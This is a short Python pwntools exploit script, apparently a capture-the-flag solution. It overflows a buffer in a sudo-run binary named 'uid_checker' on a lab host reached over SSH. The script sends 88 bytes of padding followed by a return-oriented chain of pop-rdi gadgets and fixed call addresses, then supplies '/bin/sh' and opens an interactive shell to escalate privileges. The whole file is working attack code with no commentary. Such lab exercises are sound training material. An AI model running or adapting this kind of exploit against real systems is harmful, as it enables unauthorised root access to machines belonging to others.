#!/usr/bin/env python3
from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88
payload = cyclic(offset)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x4005b0)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x400570)

s = ssh(host='10.10.139.182', user='dave')
p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive()
